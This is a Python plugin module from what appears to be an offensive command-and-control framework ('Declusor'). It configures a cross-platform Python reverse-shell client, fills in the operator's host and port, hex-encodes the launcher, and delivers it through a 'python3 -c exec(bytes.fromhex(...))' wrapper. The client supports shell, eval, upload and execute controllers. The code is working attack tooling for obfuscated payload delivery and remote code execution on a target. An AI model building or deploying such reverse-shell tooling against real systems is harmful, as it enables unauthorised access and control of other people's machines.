import os
from collections.abc import Mapping
from pathlib import Path
from typing import Final

from declusor import config, contract, lang, util

from .connection import PySocketConnection, PySocketRenderer

_DEFAULT_ROOT = Path(__file__).resolve().parents[2]


class PySocketConfig(contract.ParsedArguments, total=False):
    """Client-specific configuration options for py_socket."""


class PySocketPlugin(contract.IPluginExtension[PySocketConfig]):
    """Plugin that configures the Python reverse-shell client.

    Registers the ``py_socket`` client, which deploys a self-contained Python
    agent compatible with any Python 3.6+ environment. Unlike the shell_socket
    client, this agent operates cross-platform (Linux, macOS, Windows) and
    evaluates payloads natively in the Python runtime via ``exec``, or through
    the operating system shell via ``subprocess``.
    """

    name = "py_socket"
    description = "Cross-platform Python reverse-shell with in-memory execution and subprocess fallback."
    version = "1.0.0"
    author = "Declusor Team"
    options_type = PySocketConfig
    supported_controllers = frozenset(
        {
            config.ControllerType.LOAD,
            config.ControllerType.COMMAND,
            config.ControllerType.EVAL,
            config.ControllerType.SHELL,
            config.ControllerType.UPLOAD,
            config.ControllerType.EXECUTE,
        }
    )

    @classmethod
    def configure_parser(cls, parser: contract.IArgumentParser, /) -> None:
        """Register py_socket-specific command-line arguments."""

        return None

    @classmethod
    def extract_options(cls, raw: Mapping[str, object], /) -> PySocketConfig:
        """Extract and construct typed options for py_socket."""

        return PySocketConfig()

    @classmethod
    def build_config(
        cls,
        host: str,
        port: int,
        options: PySocketConfig,
        /,
        filesystem: contract.PluginFilesystem | None = None,
        mode: config.ExecutionMode = config.DEFAULT_EXECUTION_MODE,
    ) -> contract.PluginConfig[PySocketConfig]:
        """Build the py_socket client configuration."""

        resolved_filesystem = filesystem or contract.PluginFilesystem.from_root(_DEFAULT_ROOT)

        return contract.PluginConfig(
            kind=cls.name,
            host=host,
            port=port,
            options=options,
            options_type=cls.options_type,
            filesystem=resolved_filesystem,
            mode=mode,
        )

    @classmethod
    def validate(cls, plugin_config: contract.PluginConfig[PySocketConfig], /) -> None:
        """Validate the py_socket client configuration."""

        launcher_file = plugin_config.filesystem.launchers / "py_socket_client.py"

        if not launcher_file.is_file():
            raise config.ParserError(f"Client launcher file does not exist: {launcher_file}")

    @classmethod
    def build_runtime(cls, plugin_config: contract.PluginConfig[PySocketConfig], /) -> contract.IPluginRuntime:
        """Build the py_socket runtime from client configuration."""

        return PySocketRuntime(plugin_config)


class PySocketRuntime(contract.IPluginRuntime):
    """Runtime adapter between Python client configuration and its transport."""

    DEFAULT_WRAPPER_TEMPLATE: Final[str] = "python3 -c 'exec(bytes.fromhex(\"$DECLUSOR_SCRIPT\"))'"

    def __init__(self, plugin_config: contract.PluginConfig[PySocketConfig], /) -> None:
        self._plugin_config = plugin_config
        self._renderer = PySocketRenderer()
        self._expected_ack = util.hash_sha256(config.DEFAULT_CLIENT_ACK_SEED)
        self._processor = PySocketProcessor(plugin_config.filesystem)

    @property
    def processor(self) -> contract.IPluginProcessor:
        """The Python client file store."""

        return self._processor

    @property
    def launcher(self) -> contract.LauncherDelivery:
        """Return the rendered Python client launcher delivery envelope."""

        rendered_bytes = self._processor.render_launcher(
            self._plugin_config.host,
            self._plugin_config.port,
            self._expected_ack,
        )

        return contract.LauncherDelivery(
            script=rendered_bytes,
            wrapper_template=self.DEFAULT_WRAPPER_TEMPLATE,
        )

    def create_connection(self, transport: contract.ITransport, /) -> contract.IConnection:
        """Create a py_socket connection for an accepted transport channel."""

        return PySocketConnection(
            transport,
            self._renderer,
            self._processor,
            expected_ack=self._expected_ack,
            timeout=self._plugin_config.timeout or config.DEFAULT_CONNECTION_TIMEOUT,
        )


class PySocketProcessor(contract.IPluginProcessor):
    """Filesystem adapter for Python client templates, libraries and payloads.

    Resolves launchers, helpers and modules from the plugin's own self-contained
    assets directory, with support for user-specified overlay directories.
    """

    def __init__(
        self,
        filesystem: contract.PluginFilesystem,
        library_extensions: tuple[str, ...] = (".py",),
        module_extensions: tuple[str, ...] = (".py",),
    ) -> None:
        self._filesystem = filesystem
        self._library_extensions = library_extensions
        self._module_extensions = module_extensions

    @property
    def filesystem(self) -> contract.PluginFilesystem:
        """The plugin filesystem layout exposing asset directories."""

        return self._filesystem

    @property
    def helpers(self) -> bytes:
        """Load and concatenate valid Python helper libraries for backward compatibility."""

        all_helpers = self.load_all_helpers()

        return b"\n\n".join(all_helpers.values())

    def render_launcher(self, host: str, port: int, acknowledge: bytes, /) -> bytes:
        """Read, interpolate, sanitize, and hex-encode the client launcher script."""

        launcher_path = self._filesystem.launchers / "py_socket_client.py"

        try:
            client_script_template = launcher_path.read_text(encoding="utf-8")
        except OSError as error:
            raise config.ConnectionError(f"Failed to read client script: {error}") from error

        hex_ack = acknowledge.hex()
        rendered = util.format_template(
            client_script_template,
            HOST=host,
            PORT=str(port),
            ACKNOWLEDGE=hex_ack,
            DECLUSOR_HOST=host,
            DECLUSOR_PORT=str(port),
            DECLUSOR_ACK=hex_ack,
            DECLUSOR_CH_EXIT=str(int(config.ChannelType.PROCESS_EXIT)),
            DECLUSOR_CH_STDOUT=str(int(config.ChannelType.STDOUT)),
            DECLUSOR_CH_STDERR=str(int(config.ChannelType.STDERR)),
            DECLUSOR_CH_STDIN=str(int(config.ChannelType.STDIN)),
            DECLUSOR_CH_SIGNAL=str(int(config.ChannelType.SIGNAL)),
            DECLUSOR_CH_HEARTBEAT=str(int(config.ChannelType.HEARTBEAT)),
        )

        sanitized = lang.python.sanitize_source(rendered)
        encoded = sanitized.encode("utf-8").hex()

        return encoded.encode("ascii")

    def find_helper(self, helper_name: str, /) -> Path | None:
        """Resolve a single helper library by name or relative path."""

        helper_path = (self._filesystem.helpers / helper_name).resolve()

        if helper_path.is_file():
            return helper_path

        for ext in self._library_extensions:
            candidate = (self._filesystem.helpers / f"{helper_name}{ext}").resolve()

            if candidate.is_file():
                return candidate

        return None

    def find_module(self, module_name: str, /) -> Path | None:
        """Resolve an on-demand module by name or relative path."""

        clean_name = module_name.removeprefix("modules/").removeprefix(f"modules{os.sep}")
        module_path = (self._filesystem.modules / clean_name).resolve()

        if module_path.is_file():
            return module_path

        for ext in self._module_extensions:
            candidate = (self._filesystem.modules / f"{clean_name}{ext}").resolve()

            if candidate.is_file():
                return candidate

        return None

    def load_helper(self, helper_path: Path | str, /) -> bytes:
        """Load a single helper library by path or name."""

        path = Path(helper_path)
        path = (self._filesystem.helpers / path).resolve() if not path.is_absolute() else path.resolve()

        if not util.validate_file_relative(path, self._filesystem.helpers):
            raise config.InvalidOperation(f"Helper path '{helper_path}' is outside permitted directory.")

        return util.load_file(path)

    def load_all_helpers(self) -> Mapping[str, bytes]:
        """Load all valid Python helper libraries."""

        if not self._filesystem.helpers.exists():
            return {}

        helpers: dict[str, bytes] = {}

        for file in sorted(self._filesystem.helpers.iterdir()):
            if file.is_file() and util.validate_file_extension(file, self._library_extensions):
                helpers[file.name] = util.load_file(file)

        return helpers

    def load_module(self, module_path: Path | str, /) -> bytes:
        """Load one operator-selected module from the modules directory."""

        path = Path(module_path)
        path = (self._filesystem.modules / path).resolve() if not path.is_absolute() else path.resolve()

        if not util.validate_file_relative(path, self._filesystem.modules):
            raise config.InvalidOperation(f"Module path '{module_path}' is outside the permitted modules directory.")

        if not util.validate_file_extension(path, self._module_extensions):
            raise config.InvalidOperation(f"Module '{path.name}' has an unsupported extension. Allowed: {self._module_extensions}")

        return util.load_file(path)
